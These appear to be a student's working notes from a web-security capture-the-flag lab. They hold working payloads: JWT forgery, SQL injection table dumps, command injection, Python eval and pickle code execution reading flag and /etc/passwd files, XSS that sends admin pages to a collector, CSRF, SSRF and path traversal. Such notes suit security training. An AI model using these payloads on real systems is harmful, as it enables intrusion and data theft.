# C01

login with analyst / analyst123 with a POST to /c01
receive back a Set-Cookie: c01_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbmFseXN0Iiwicm9sZSI6InVzZXIifQ.VoiX6AK9Ac-GkW8z89uEg9tP4fe9owybI3xHtxP8gnk; HttpOnly;

it's a JWT: {
    "typ": "JWT",
    "alg": "HS256"
}
{
  "sub": "analyst",
  "role": "user"
} + signature

then a GET to /dashboard with this token.
Protected endpoint: /c01/admin/flag
with my analyst token  i get forbidden
if i change only sub and role to admin, invalid token so signature is checked.
Signing algorithm set to none: works. Flag: offsec{c01_413ff87b67d1db7e}

______________________________________________________

# C02

login with auditor / auditor123 with a POST to /c02
receive back a Set-Cookie: c02_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQua2V5In0.eyJzdWIiOiJhdWRpdG9yIiwicm9sZSI6InVzZXIifQ.7JR0jQC-pStca4Yk8StQwP1Nqio3JJMqe1WO4IZXIIY; HttpOnly; Path=/

it's a JWT: {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "default.key"
}
{
    "sub": "auditor",
    "role": "user"
} + signature

then a GET to /console with this token

Protected endpoint: /c02/admin/flag

with my auditor token  i get forbidden
if i change only sub and role to admin, invalid signature so signature is checked.
None algorithm attack: invalid token

i can try to change kid to ../../../../../dev/null and then sign with empty key.
Works. Flag: offsec{c02_e3b20bb3d42bedce}
______________________________________________________

# C03

form where i can send data that is used in a unsafe sql query.
Sql injection
' or 1=1-- -    : i get all contents of this table
' UNION SELECT null, null, null, null-- -   : 4 parameters
' UNION SELECT sqlite_version(), null, null, null-- -   : using sqlite
' UNION SELECT name, sql, null, null FROM sqlite_master WHERE type='table'-- -  

i get name: c03_sealed_records; sql: CREATE TABLE c03_sealed_records(code TEXT,secret TEXT,owner TEXT)

' UNION SELECT code, secret, owner, null from c03_sealed_records-- -    : FLAG: offsec{c03_8adfe9d252118b8f}

______________________________________________________

# C04

when i GET to /c04/
i get a Set-Cookie: c04_prefs=eyJ0ZWFtIjogImJsdWUifQ; Path=/.
That is {"team": "blue"} base64 encoded
and redirected to /c04 with this cookie

The portal personalizes updates from client-side state.
try to change the cookie with team red. I can inject sql inside the team value
' or 1=1-- -
' UNION SELECT null, null-- -

nothing works (not even the solution, ' UNION SELECT 'OPS',value FROM c04_operations-- - ...)

______________________________________________________

# C05

i can create an account: name, password, displayed name. This is stored on a server db.
i can sql inject into displayed name, the server probably uses displayed name in a sql query when loading my feed
' or 1=1-- -    : works
' UNION SELECT NULL,NULL-- -
' UNION SELECT sqlite_version(),NULL-- -    : uses sqlite
' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- -  

c05_vault
CREATE TABLE c05_vault(secret TEXT,marker TEXT)

' UNION SELECT secret, marker from c05_vault-- -    : FLAG is offsec{c05_4c328c0d28383f99}

______________________________________________________

# C06

can login with a form that sends JSON to /c06/api/login.
POST with Content-Type: application/json and body: {"username":"guest","password":"guest123"}

i get back: {"role":"user","status":"authenticated"}

the page uses this script:
<script>
    f.onsubmit = async (e) => {
        e.preventDefault();
        let r = await fetch('/c06/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: f.username.value,
                password: f.password.value
            })
        });
        out.textContent = await r.text()
    }
</script>

let's try {"username":"guest' or 1=1-- -","password":"guest123"}
spaces are denied by a filter
can overcome spaces with comments /**/
or tokens ()
(guest')OR(1=1)

NEVERMIND, IT'S NoSQL-style operator injection, we didn't do.
______________________________________________________

# C07

classic command injection running ping on given ip address 
; is rejected, && too and spaces (probably also |)
$(ls) works

$(ls${IFS}/)
$(ls${IFS}/flags)
$(cat${IFS}/flags/...)
or 
$(ls${IFS}/opt/pulse)
$(cat${IFS}/opt/pulse/c07.txt)

______________________________________________________

# C08

input used inside python eval
let's try to open a shell
os.system("id"): name os not defined
__import__("os").system("ls")   : only gives me exit code (0)
or
open('/etc/passwd').read()
or
__import__("subprocess").check_output(["ls", "/"]).decode()

eval(expr)
runs with access to the current globals, locals, and Python builtins. __import__ is a builtin. open is a builtin.

so i can use:
__import__("subprocess").check_output(["cat", "/flags/c08.txt"])
or 
open('/flags/c08.txt').read()

______________________________________________________

# C09
already done
login as reporter, report123
use stored xss

if i try <script>alert(1)</script> in the form body and send it, it's stored on the server with the POST to /create
Then i can access it with GET /note/id.

So i can create a note with:
<script>fetch('/admin/secret').then(r=> r.text()).then(t=> fetch('webhook?t='+t))</script> -> this works
might need to encode t, encodeURIComponent(t)

or i can make him send a post to my collector so i read it from my dashboard without the webhook
so instead of fetch('webhook?t='+t):

fetch('/collector/my_token', {method:'POST', credentials: "include", body: t})

and then read the flag from my page.
<script>fetch('/c09/admin/secret').then(r=> r.text()).then(t=> fetch('/c09/collector/WtigevEepkNeaFT4', {method:'POST', credentials: "include", body: t}) )</script> -> this also works, see it in the collector tab. 

______________________________________________________

# C10

very similar to before, login, have a collector token. Can send a note, or go to the viewer to see my fragments. 
The viewer page contains this script:
<script>
    const v = decodeURIComponent(location.hash.slice(1));
    document.getElementById('preview').innerHTML = v || '<em>No fragment supplied</em>';
</script>

so it's DOM-XSS
i can try it with a GET to /c10/viewer#<script>alert(1)</script> -> usually browsers dont' execute scripts inside inner html
try: #<img src='x' onerror='alert(1)'>  :works.

Let's try on my broser locally:
GET to /c10/viewer#
<img src='x' onerror="fetch('/c10/admin/data').then(r=> r.text()).then(t=> fetch('/c10/collector/3PImkS1-b4edqGeE', {method:'POST', credentials: 'include', body: t}))">


so i send to admin the following note he will view:
<iframe src="/c10/viewer#...">
where the hash is the one i tested locally so:
<iframe src="/c10/viewer#<img src='x' onerror="fetch('/c10/admin/data').then(r=> r.text()).then(t=> fetch('/c10/collector/3PImkS1-b4edqGeE', {method:'POST', credentials: 'include', body: t}))">">

#<img src='x' onerror="fetch('/c10/admin/data').then(r=> r.text()).then(t=> fetch('/c10/collector/3PImkS1-b4edqGeE', {method:'POST', credentials: 'include', body: t}))">

______________________________________________________

# C11
login as victim / victim123 with a POST to /c11
get back Cookie: session=eyJjMTFfdXNlciI6InZpY3RpbSJ9.ajbkyA.Gbj-2rEsK9GSvHjTZQei5aLGzos -> {"c11_user":"victim"}. gibberish

i can send a transfer with a form "to": friend, "amount": ... with a POST to /c11/transfer with the cookie, but not CSRF token

The attacker page is a page that automatically sends the POST to /c11/transfer, to=attacker&amount=900
so i just send the crafted attacker link to the victim 

______________________________________________________

# C12

makes request to a link.  Blocks request to internal url. I can try the name resolved by the internal docker DNS
http://internal:5000/ops/flag

______________________________________________________

# C13
XML ENTITIES

______________________________________________________

# C14

must Download /srv/secret/c14.txt

Login with a POST to /c14/ with reader / reader123
get Set-Cookie: session=eyJjMTFfdXNlciI6InZpY3RpbSIsImMxNF9vayI6dHJ1ZX0.ajbxNg.jHbI8X78AqrFqn-HkDdkksJ9yK8; HttpOnly; Path=/; SameSite=Lax
decoded base64: {"c14_ok":true}...

then GET to /cabinet with this cookie

can do a GET to /c14/download?file=weekly.txt HTTP/1.1

i modify the query parameter to
?file=../../../../srv/secret/c14.txt

______________________________________________________

# C15

Objective: Make unsafe state restoration and reveal /flags/c15.txt.
can do a POST to c15 with
state=gASVKwAAAAAAAAB9lCiMBXRoZW1llIwIbWlkbmlnaHSUjAZsYXlvdXSUjAdjb21wYWN0lHUu
which is gibberish + something like {'theme': 'midnight', 'layout': 'compact'}

it's a unsafe serializer using pickle 
...
Base64 pickle whose `__reduce__` returns `subprocess.check_output` with `['cat','/flags/c15.txt']`.